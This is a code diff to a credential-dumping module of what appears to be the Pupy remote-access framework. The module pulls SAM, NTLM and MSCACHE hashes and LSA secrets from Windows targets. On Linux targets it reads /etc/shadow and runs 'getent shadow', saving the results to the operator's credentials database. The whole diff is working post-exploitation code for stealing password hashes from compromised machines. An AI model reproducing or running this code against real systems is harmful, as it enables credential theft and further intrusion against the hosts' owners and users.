@@ -37,14 +37,16 @@ __class_name__="CredDump"
 @config(cat="creds", compatibilities=['windows', 'linux', 'darwin'], tags=['creds',
     'credentials', 'password', 'gather', 'hives'])
 class CredDump(PupyModule):
-
     """ download the hives from a remote windows system and dump creds """
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
 
     def run(self, args):
-        self.rep = os.path.join("data", "downloads", self.client.short_name(), "creds")
+        config = self.client.pupsrv.config or PupyConfig()
+        self.db = Credentials(client=self.client.short_name(), config=self.config)
+        self.rep = os.path.join(config.get_folder('creds'), self.client.short_name())
+
         try:
             os.makedirs(self.rep)
         except Exception:
@@ -61,13 +63,16 @@ class CredDump(PupyModule):
         self.client.load_package("hashdump")
         hashes = self.client.conn.modules["hashdump"].hashdump()
         if hashes:
-            db = Credentials()
-            db.add([
-                {'Hash':hsh[1], 'Login': hsh[0], 'Category': 'System hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
-            ])
+            self.db.add([{
+                'Hash':hsh[1],
+                'Login': hsh[0],
+                'Category': 'System hash',
+                'CredType': 'hash'
+            } for hsh in hashes ])
+
             for hsh in hashes:
                 self.log('{}'.format(hsh))
-            
+
             self.success("Hashes stored on the database")
         else:
             self.error('no hashes found')
@@ -112,35 +117,43 @@ class CredDump(PupyModule):
         except Exception as e:
             self.error('/etc/shadow is not accessible: {}'.format(e))
 
-        self.client.load_package('pupyutils.safepopen')
-        sopen = self.client.conn.modules['pupyutils.safepopen'].SafePopen
+        rsubprocess = self.client.conn.modules.subprocess
 
         try:
             with open(os.path.join(self.rep, 'getent.passwd'), 'w') as passwd:
-                for line in sopen(['getent', 'passwd']).execute():
-                    if line:
-                        add_hashes(line)
+                for line in rsubprocess.check_output('getent passwd', shell=True).split('\n'):
+                    if not line:
+                        continue
+
+                    add_hashes(line)
+                    passwd.write(line+'\n')
 
         except Exception as e:
             self.error('getent passwd failed: {}: {}'.format(type(e), e.message))
 
         try:
             with open(os.path.join(self.rep, 'getent.shadow'), 'w') as shadow:
-                for line in sopen(['getent', 'shadow']).execute():
-                    if line:
-                        add_hashes(line)
+                for line in rsubprocess.check_output('getent shadow', shell=True).split('\n'):
+                    if not line:
+                        continue
+
+                    add_hashes(line)
+                    shadow.write(line+'\n')
 
         except Exception as e:
             self.error('getent shadow failed: {}: {}'.format(type(e), e.message))
 
-        db = Credentials()
-        db.add([
-            {'Hash':':'.join(hsh.split(':')[1:]), 'Login': hsh.split(':')[0], 'Category': 'Shadow hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
+        self.db.add([{
+            'Hash':':'.join(hsh.split(':')[1:]),
+            'Login': hsh.split(':')[0],
+            'Category': 'Shadow hash',
+            'CredType': 'hash'
+            } for hsh in hashes
         ])
 
         for hsh in hashes:
             self.log('{}'.format(hsh))
-        
+
         self.success("Hashes stored on the database")
 
     def windows(self):
@@ -190,7 +203,6 @@ class CredDump(PupyModule):
             self.warning("error deleting temporary files: %s"%str(e))
 
         # Time to run creddump!
-        db = Credentials()
         hashes = []
 
         # HiveFileAddressSpace - Volatilty
@@ -204,7 +216,12 @@ class CredDump(PupyModule):
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
             self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                 d.lower(), dn.lower()))
-            hashes.append({'Login': u.lower(), 'Hash': "%s:%s:%s" % (h.encode('hex'), d.lower(), dn.lower()), 'Category': 'MSCACHE hash', 'CredType': 'hash', 'uid':self.client.short_name()})
+            hashes.append({
+                'Login': u.lower(),
+                'Hash': "%s:%s:%s" % (h.encode('hex'), d.lower(), dn.lower()),
+                'Category': 'MSCACHE hash',
+                'CredType': 'hash'
+            })
 
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
@@ -214,9 +231,14 @@ class CredDump(PupyModule):
             if not lmhash: lmhash = empty_lm
             if not nthash: nthash = empty_nt
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
-            hashes.append({'Login': get_user_name(user), 'Hash': "%s:%s" % (lmhash.encode('hex'), nthash.encode('hex')), 'Category': 'NTLM hash', 'CredType': 'hash', 'uid':self.client.short_name()})
+            hashes.append({
+                'Login': get_user_name(user),
+                'Hash': "%s:%s" % (lmhash.encode('hex'), nthash.encode('hex')),
+                'Category': 'NTLM hash',
+                'CredType': 'hash'
+            })
 
-        db.add(hashes)
+        self.db.add(hashes)
         self.success("Hashes stored on the database")
 
         self.success("dumping lsa secrets...")
